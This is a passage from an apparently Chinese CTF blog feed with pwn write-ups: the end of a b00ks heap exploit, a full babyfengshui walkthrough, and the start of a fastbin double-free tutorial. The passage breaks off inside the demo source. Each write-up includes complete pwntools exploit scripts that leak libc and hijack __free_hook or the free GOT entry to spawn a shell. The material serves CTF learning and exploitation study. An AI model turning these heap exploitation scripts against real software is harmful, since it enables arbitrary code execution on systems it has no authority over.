<p>此时，我们画一下图书在内存中的布局<br><img src="/./images/p7/image-50.png"><br>我们想要得到libc的基地址，可以通过泄露以mmap拓展的这个book2的地址，怎么泄露呢？我们知道当调用Print的时候，程序会打印出来一些信息。<strong>既然想打印出来book2的地址，那么就可以将fake_book1_name指针指向book2_name的地址。Print在打印book1_name的时候，就会找到book2_name，把指针值（因为book2是以mmap拓展，所以book2的指针指向的地址都是0x7fff开头的）打印出来</strong>，看下图<br><img src="/./images/p7/image-51.png"><br>所以只需要将fake_book1_name指向 **0x555555608168 (&#x3D;book1_addr + 0x38,book1_addr是最初我们泄露的地址，也是real_book1_id)**，这样就可以泄露出这个0x7fff开头的地址，从而得到libc<br>用edit布置我们的fake_book1_id为1；fake_book1_name为book1_addr + 0x38</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
<p><img src="/./images/p7/image-53.png"><br>再利用off by one 漏洞（change作者名），将图书1结构体指针的低位覆盖为\x00，这样fake_book就生效了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br></pre></td></tr></table></figure>
<p><img src="/Snipaste_2025-02-15_00-09-32.png"><br>那么此时打印Book1的信息，就可以泄露出“0x7ffff7fd4010”这个地址了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
<p><img src="/./images/p7/image-54.png"><br>前面说过，book2_name的地址，相对libc基地址的偏移是固定的，通过vmmap看到可读可执行的libc.so的起始地址是0x7ffff7800000<br><img src="/./images/p7/image-55.png"><br>我们得到的book2_name_addr的地址是0x7ffff7fd4010，那么</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># book2_name_addr - libc_base = 0x7ffff7fd4010 - 0x7ffff7800000 = 0x7D4010</span><br><span class="line"># 也就是</span><br><span class="line"># libc_base = book2_name_addr - 0x7D4010</span><br></pre></td></tr></table></figure>

<h2 id="5-钩子和one-gadget"><a href="#5-钩子和one-gadget" class="headerlink" title="5.钩子和one_gadget"></a>5.钩子和one_gadget</h2><p>当delete一个book的时候，程序会调用free，所以我们用__free_hook去钩one_gadget<br>先计算__free_hook的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br></pre></td></tr></table></figure>
<p>至于one_gadget，因为我们已经泄露libc了，所以One_gadget可以直接在libc.so里面找，然后算上偏移就可以了<br><img src="/./images/p7/image-56.png"><br>看到三个gadget：0x4527a、0xf03a4、0xf1247（不同ubuntu版本得到的不一样，我的版本下第一个可以成功）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br></pre></td></tr></table></figure>


<h2 id="6-改善《4-泄露libc基地址》的payload"><a href="#6-改善《4-泄露libc基地址》的payload" class="headerlink" title="6.改善《4.泄露libc基地址》的payload"></a>6.改善《4.泄露libc基地址》的payload</h2><p>我们先想一想，接下来挂钩子明显还是要用到fake_book1结构体，但是不能像之前那要edit(1,xxx)布置了，<strong>因为book1结构体指针已经指向了fake_book1，如果直接edit(1,xxx)会修改fake_book1_desc指针指向的内容，而此时我们意识到我们的fake_book1_desc指针是空的！</strong><br>还记得当时我们当时布置fake_book1是怎么样布置的吗？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
<p><img src="/./images/p7/image-57.png"><br>稍微改善一下那时候的payload，把fake_book1_desc这片空白的空间也利用起来：fake_book1_name指向了book2_name，让fake_book1_desc也指向book2_desc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)     # 0xffff作用内存地址的结束符</span><br><span class="line"># book2_desc和book2_name地址相差8个字节</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
<p>此时内存是这样的<br><img src="/./images/p7/image-58.png"></p>
<h2 id="7-挂钩子"><a href="#7-挂钩子" class="headerlink" title="7.挂钩子"></a>7.挂钩子</h2><p>改善之后，<strong>调用edit(1,xxx)，程序会直接去修改book2_desc指针为xxx，所以我们通过edit(1,free_hook)把钩子放在book2_desc，再通过edit(2,one_gadget),把one_gadget挂在钩子上，调用delete执行free，GET SHELL!</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">libc = ELF(&quot;/home/kuban/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="line">io = process(&#x27;./b00ks&#x27;)</span><br><span class="line"></span><br><span class="line">def debug():	</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def delete(book_id):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(id))</span><br><span class="line"></span><br><span class="line">def edit(book_id,des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def Print():</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">def change(author):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,author)</span><br><span class="line"></span><br><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(208,b&#x27;AAAA&#x27;,32,b&#x27;aaaa&#x27;)</span><br><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">libc_base = book2_name_addr - 0x7d4010</span><br><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br><span class="line">log.success(hex(free_hook))</span><br><span class="line"></span><br><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>【buuCTF刷题】babyfengshui</title>
    <url>/posts/a500/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>这道题利用布置堆的结构缺陷get shell，非常精妙。一开始我没有理清”指针”和”指针指向的内容”这两个概念，迟迟搞不明白，以后尤其是堆题要特别注意。</p>
<p>还有个疑问还没有解决：既然description2的内容作为system的参数，EXP 为什么不能这样写？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">add(0x80,&#x27;CCCC&#x27;,0x80,&#x27;cccc&#x27;)</span><br><span class="line">……</span><br><span class="line">update(2,0x10,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(2)</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><blockquote>
<p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2JhYnlmZW5nc2h1aV8zM2MzXzIwMTY=">https://buuoj.cn/challenges#babyfengshui_33c3_2016<i class="fa fa-external-link-alt"></i></span><br>libc在这里获取：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9yZXNvdXJjZXM=">https://buuoj.cn/resources<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>checksec 发现Partial RELRO，说明got表可写，没有开PIE<br><img src="/./images/p6/image.png"></p>
<p>IDA里分析，可以看到是一道经典的菜单堆题，对函数做一些重命名，我们有增、删、查、更新操作<br><img src="/./images/p6/image-2.png"></p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>这道题有个Alarm clock，所以先将这个call alarm 给NOP掉<br><img src="/./images/p6/image-3.png"><br><img src="/./images/p6/image-4.png"><br>再来看程序逻辑<br><img src="/./images/p6/image-6.png"><br>add——添加description大小、name、text长度、text<br>display——展示name和description（description其实就是text）<br>update——更新text长度、text（也就是改变description内容）<br>delete就不用讲了</p>
<p>下面看看具体的程序实现，看add和update就够用了</p>
<h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p><img src="/./images/p6/image-1.png"><br>首先为description分配我们输入的大小的空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">description = malloc(size);</span><br><span class="line">memset(description, 0, size);</span><br></pre></td></tr></table></figure>
<p>接着为name分配了固定0x80大小的空间，并存放指向description堆的指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = malloc(0x80u);</span><br><span class="line">memset(name, 0, 0x80u);</span><br><span class="line">*name = description;  </span><br></pre></td></tr></table></figure>
<p>然后又用一个指针指向了chunk name</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*(&amp;ptr + byte_804B069) = name;</span><br></pre></td></tr></table></figure>
<p>调用get_name获取name之后，调用update函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;name: &quot;);</span><br><span class="line">get_name(*(&amp;ptr + byte_804B069) + 4, 124); </span><br><span class="line">//为什么是*(&amp;ptr + byte_804B069) + 4呢？因为*(&amp;ptr + byte_804B069)指向了chunk name，而chunk name的前四个字节存放的是指向chunk description的指针</span><br><span class="line">update(byte_804B069++);</span><br></pre></td></tr></table></figure>
<p>update函数等一下看，理一下这些chunk和指针的关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptr + byte_804B069 指向 chunk name ---&gt; *(&amp;ptr + byte_804B069) == &amp;chunk_name</span><br><span class="line">chunk name 指向chunk description   ---&gt; **(&amp;ptr + byte_804B069) == &amp;chunk_description</span><br></pre></td></tr></table></figure>
<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p><img src="/./images/p6/image-7.png"><br>先输入一个text length</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;text length: &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%u%c&quot;, &amp;text_length, &amp;v2);</span><br></pre></td></tr></table></figure>

<p>然后做一个判断，如果chunk_description的地址加上text_length的长度超过name的地址，程序会认为发生堆溢出——覆盖chunk name的数据了，就会exit；如果没有溢出，就可以修改text(description)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( (text_length + **(&amp;ptr + a1)) &gt;= *(&amp;ptr + a1) - 4 )</span><br><span class="line">//if ( (text_length + &amp;chunk_description) &gt;= &amp;chunk_name - 4 )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;my l33t defenses cannot be fooled, cya!&quot;);</span><br><span class="line">  exit(1);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;text: &quot;);</span><br><span class="line">get_name(**(&amp;ptr + a1), text_length + 1);</span><br></pre></td></tr></table></figure>

<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>在glibc中，变量申请堆时，堆管理器先在bins中找有没有符合的chunk，如果没有就从TOP chunk中割出相应大小的空间给变量。在ADD操作中，我们连续申请了两块chunk，一般情况下这两块chunk在空间中是连续存放的。比如我们申请size of description的大小为0x80</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def add(size,name,length,text):</span><br><span class="line">        io.sendlineafter(&#x27;Action: &#x27;,&#x27;0&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;description: &#x27;,str(size))</span><br><span class="line">        io.sendlineafter(&#x27;name: &#x27;,str(name))</span><br><span class="line">        io.sendlineafter(&#x27;length: &#x27;,str(length))</span><br><span class="line">        io.sendlineafter(&#x27;text: &#x27;,text)</span><br><span class="line">add(0x80,&#x27;AAAA&#x27;,0x80,&#x27;aaaa&#x27;)</span><br></pre></td></tr></table></figure>
<p>ADD会连续申请两块连续的0x88的chunk<br><img src="/./images/p6/image-11.png"><br>这时候想update 更新description的内容时，他先做一个判断，只要填充的description没有覆盖到name，就不会exit退出。同样的再ADD几次都是连续申请空间<br><img src="/./images/p6/image-12.png"><br>那么如果description 和 name 在空间上不连续呢？如果我们先删除chunk 0，chunk_description和chunk_name合并为一个chunk，归入unsortbins中</p>
<p><img src="/./images/p6/image-16.png"><br>再ADD这样一个对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x100,&#x27;DDDD&#x27;,0x150,&#x27;dddd&#x27;)</span><br></pre></td></tr></table></figure>
<p>首先新的chunk_description3需要0x108大小的chunk，而Unsortbins中的chunk就有0x110的大小，那么堆管理器就会将这块空间给chunk_description3。而为chunk_name3分配0x88大小的chunk时，由于Bins中没有符合的chunk，就会在TOP chunk中割下来0x88的大小给name3。这时，chunk_description3和chunk_name3在空间上不再连续了，我们就可以利用update任意改写他们之间的空间内容<br><img src="/./images/p6/image-15.png"><br>那么通过以下几步就可以获取shell</p>
<ol>
<li>修改指向description1指针为free的got表地址，当我们输出（display）description的内容时，因为它指向的是free的got表地址，display就会输出free的真实地址<blockquote>
<p>还记得前面说的吗？chunk name的前四个字节存放的是指向chunk description的指针，所以payload要填充0x108+0x88+0x8个垃圾数据，就能来到指向description1的指针</p>
</blockquote>
</li>
<li>计算libc基地址，得到system的真实地址</li>
<li>修改description1的内容为system(update(1,0x10,system_addr))，<strong>因为指向description1的指针是free_got，而内容现在是system_addr，所以程序在调用free时，实际上调用了system函数，也就是说free被劫持为system</strong></li>
<li>我们知道delete会调用free，我们可以在创建description2的时候内容写为”&#x2F;bin&#x2F;sh\x00”，然后free2时，free(**(&amp;ptr + a1))就相当于时system(‘&#x2F;bin&#x2F;sh’)，拿到shell</li>
</ol>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">x64_32 = 1</span><br><span class="line">if x64_32:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;amd64&#x27;)</span><br><span class="line">else:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :io.send(data)</span><br><span class="line">sa      = lambda delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = lambda num                :io.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">itr     = lambda                    :io.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">l64     = lambda      :u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">l32     = lambda      :u32(io.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">#########################################################################################</span><br><span class="line">io = process(&#x27;./pwn&#x27;)</span><br><span class="line">#io = remote(&#x27;node5.buuoj.cn&#x27;,)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/home/kuban/Desktop/pwn/buuctf/libc/libc-2.23-16-32.so&#x27;)</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">def add(size,name,length,text):</span><br><span class="line">        sla(&#x27;Action: &#x27;,&#x27;0&#x27;)</span><br><span class="line">        sla(&#x27;description: &#x27;,str(size))</span><br><span class="line">        sla(&#x27;name: &#x27;,str(name))</span><br><span class="line">        sla(&#x27;length: &#x27;,str(length))</span><br><span class="line">        sla(&#x27;text: &#x27;,text)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">        sla(&#x27;Action: &#x27;,&#x27;1&#x27;)</span><br><span class="line">        sla(&#x27;index: &#x27;,str(index))</span><br><span class="line">def update(index,length,text):</span><br><span class="line">        sla(&#x27;Action: &#x27;,&#x27;3&#x27;)</span><br><span class="line">        sla(&#x27;index: &#x27;,str(index))</span><br><span class="line">        sla(&#x27;text length: &#x27;,str(length))</span><br><span class="line">        sla(&#x27;text: &#x27;, text)</span><br><span class="line">def display(index):</span><br><span class="line">        sla(&#x27;Action: &#x27;,&#x27;2&#x27;)</span><br><span class="line">        sla(&#x27;index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">add(0x80,&#x27;AAAA&#x27;,0x80,&#x27;aaaa&#x27;)</span><br><span class="line">add(0x80,&#x27;BBBB&#x27;,0x80,&#x27;bbbb&#x27;)</span><br><span class="line">add(0x80,&#x27;CCCC&#x27;,0x80,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(0)</span><br><span class="line">add(0x100,&#x27;DDDD&#x27;,0x100,&#x27;dddd&#x27;)</span><br><span class="line">payload = b&#x27;e&#x27;*(0x108+0x88+0x8) + p32(free_got)</span><br><span class="line">update(3,0x200,payload)</span><br><span class="line">display(1)</span><br><span class="line">io.recvuntil(&#x27;description: &#x27;)</span><br><span class="line">free_addr = u32(io.recv(4))</span><br><span class="line">libc_base = free_addr - libc.sym[&#x27;free&#x27;]</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">leak(&#x27;system_addr = &#x27;,system_addr)</span><br><span class="line">update(1,0x80,p32(system_addr))</span><br><span class="line">delete(2)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>buuCTF刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>babyfengshui</tag>
        <tag>Partial RELRO</tag>
      </tags>
  </entry>
  <entry>
    <title>【堆利用】fastbin-attack学习总结</title>
    <url>/posts/484e/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>本篇中的demo均来自 <em><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoZWxscGhpc2gvaG93MmhlYXA=">how2heap<i class="fa fa-external-link-alt"></i></span></em> 中的例子</p>
<p>华庭师傅的 <em><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2t1YmFuc2VjL0Vib29rcy9ibG9iL21haW4vZ2xpYmMlRTUlODYlODUlRTUlQUQlOTglRTclQUUlQTElRTclOTAlODZwdG1hbGxvYyVFNiVCQSU5MCVFNCVCQiVBMyVFNyVBMCU4MSVFNSU4OCU4NiVFNiU5RSU5MC5wZGY=">《glibc内存管理ptmalloc源代码分析》<i class="fa fa-external-link-alt"></i></span></em> 是一个很好的glibc机制入门资料，值得精读</p>
<p>由于我使用的glibc为2.35，glibc在2.26引入了tcache chunk，所以我们演示fastbin攻击要先填满tcache，然后也不能用malloc(size)，而是用calloc(1,size)，因为calloc()不会去从tcache中查找堆块，这样能保证我们操作的chunk全部位于fastbin</p>
<span id="more"></span>

<h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><p>演示一个基于 fastbin 的double-free攻击。 </p>
<h2 id="fastbin-dup-c-源代码"><a href="#fastbin-dup-c-源代码" class="headerlink" title="fastbin_dup.c 源代码"></a>fastbin_dup.c 源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 禁用标准输出缓冲区</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line"></span><br><span class="line">    // 填满 tcache</span><br><span class="line">    void *ptrs[8];</span><br><span class="line">    for (int i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">        ptrs[i] = malloc(8);</span><br><span class="line">    &#125;</span><br><span class="line">    for (int i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">        free(ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;1.calloc三个chunk\n&quot;);</span><br><span class="line">    int *a = calloc(1, 8);</span><br><span class="line">    int *b = calloc(1, 8);</span><br><span class="line">    int *c = calloc(1, 8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;第1次 calloc(1, 8): %p\n&quot;, a);</span><br><span class="line">    printf(&quot;第2次 calloc(1, 8): %p\n&quot;, b);</span><br><span class="line">    printf(&quot;第3次 calloc(1, 8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;2.然后依次释放 a,b,a 的chunk...\n&quot;);</span><br><span class="line">    free(a);</span><br><span class="line">    free(b);</span><br><span class="line">    free(a);</span><br><span class="line">    printf(&quot;现在fast bins链表为 [ %p, %p, %p ]\n&quot;, a , b , a) ;</span><br><span class="line"></span><br><span class="line">    printf(&quot;3.如果我们再分配3个chunk，将会得到%p\n&quot;, a);</span><br><span class="line">    a = calloc(1, 8);</span><br><span class="line">    b = calloc(1, 8);</span><br><span class="line">    c = calloc(1, 8);</span><br><span class="line">    printf(&quot;第1次 calloc(1, 8): %p\n&quot;, a);</span><br><span class="line">    printf(&quot;第2次 calloc(1, 8): %p\n&quot;, b);</span><br><span class="line">    printf(&quot;第3次 calloc(1, 8): %p\n&quot;, c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>编译运行（gcc记得加上”-g”参数，用gdb调试时会很方便）</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/images/p4/image-19.png"></h2><p>接下来我们在pwndbg里面看，下好断点运行</p>
<h2 id="1-分配三个chunk"><a href="#1-分配三个chunk" class="headerlink" title="1.分配三个chunk"></a>1.分配三个chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *a = calloc(1, 8); </span><br><span class="line">int *b = calloc(1, 8);</span><br><span class="line">int *c = calloc(1, 8);</span><br></pre></td></tr></table></figure>

<p>分配三个chunk，查看堆<br><img src="/images/p4/image-5.png"></p>
<p>使用parseheap查看堆结构更清晰<br><img src="/images/p4/image-11.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 记录三个chunk的起始地址</span><br><span class="line">chunk a: 0x555555559390</span><br><span class="line">chunk b: 0x5555555593b0</span><br><span class="line">chunk c: 0x5555555593d0</span><br></pre></td></tr></table></figure>

<p>查看bins，可以看到此时bins（除了tcache）都是空的<br><img src="/images/p4/image-6.png"></p>
<h2 id="2-依次释放-a-b-a-的chunk"><a href="#2-依次释放-a-b-a-的chunk" class="headerlink" title="2.依次释放 a,b,a 的chunk"></a>2.依次释放 a,b,a 的chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(a);</span><br><span class="line">free(b);</span><br><span class="line">free(a);</span><br></pre></td></tr></table></figure>
<p>依次释放 a,b,a 的chunk，查看每次free后的bins的情况<br><img src="/images/p4/image-7.png" alt="free(a)"><br><img src="/images/p4/image-8.png" alt="free(b)"><br><img src="/images/p4/image-9.png" alt="free(a)"><br>可以看到，<strong>fastbins 是一个单链表，fastbins会将free掉的chunk添加到了链表的头部。</strong></p>
<blockquote>
<p>Q: 为什么不直接free(a)之后接着free(a)呢？<br>A: 由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，但是我们可以在两次 free(a) 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。</p>
</blockquote>
<h2 id="3-再次分配三个chunk"><a href="#3-再次分配三个chunk" class="headerlink" title="3.再次分配三个chunk"></a>3.再次分配三个chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = calloc(1, 8);</span><br><span class="line">b = calloc(1, 8);</span><br><span class="line">c = calloc(1, 8);</span><br></pre></td></tr></table></figure>
<p>然后依次分配三个chunk，观察堆结构和bins的变化</p>
<p>第一次分配chunk，将fastbins链表头部的元素0x555555559390分配给了变量a <strong>（说明fastbins是LIFO——后进先出）</strong>，并且fastbins链表中还有0x555555559390，所以尽管这个chunk已经被分配了，但它依然被标记为了free，意味着也就能被再次分配给其他变量。<br><img src="/images/p4/image-12.png" alt="a = calloc(1, 8);"></p>
<p>第二次分配chunk，这时候链表某端的地址是0x5555555593b0，所以它被分配给了b，此时链表中就剩下最后的0x555555559390<br><img src="/images/p4/image-13.png" alt="b = calloc(1, 8);"></p>
<p>第三次分配chunk，将链表某端的0x555555559390再次分配给了变量c<br><img src="/images/p4/image-14.png" alt="c = calloc(1, 8);"></p>
<p>也就有了两个指向同一块内存区域的指针。<br><img src="/images/p4/image-16.png"></p>
<p>当我修改指针c的值时，指针a的值也会被修改<br><img src="/images/p4/image-17.png"></p>
<hr>
<h1 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h1><p>扩展fastbin_dup.c，演示malloc返回一个指向栈上空间的指针。</p>
<h2 id="fastbin-dup-into-stack-c-源代码"><a href="#fastbin-dup-into-stack-c-源代码" class="headerlink" title="fastbin_dup_into_stack.c 源代码"></a>fastbin_dup_into_stack.c 源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	//首先填满tcache</span><br><span class="line">    void *ptrs[7];</span><br><span class="line">    for (int i=0; i&lt;7; i++) &#123;</span><br><span class="line">		ptrs[i] = malloc(8);</span><br><span class="line">	&#125;</span><br><span class="line">	for (int i=0; i&lt;7; i++) &#123;</span><br><span class="line">		free(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unsigned long stack_var[4] __attribute__ ((aligned (0x10)));</span><br><span class="line">    stack_var[1] = 0x20;</span><br><span class="line">    fprintf(stderr, &quot;栈上创建一个数组，数组地址为%p，写入0x20（用于伪造的chunk size字段）\n&quot;,stack_var);</span><br><span class="line">    fprintf(stderr, &quot;我们想通过 malloc 申请到 %p.\n&quot;, stack_var+2);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1. 分配3个chunk。\n&quot;);</span><br><span class="line">	int *a = calloc(1,8);</span><br><span class="line">	int *b = calloc(1,8);</span><br><span class="line">	int *c = calloc(1,8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;第一次calloc(1,8): %p\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;第二次calloc(1,8): %p\n&quot;, b);</span><br><span class="line">	fprintf(stderr, &quot;第三次calloc(1,8): %p\n&quot;, c);</span><br><span 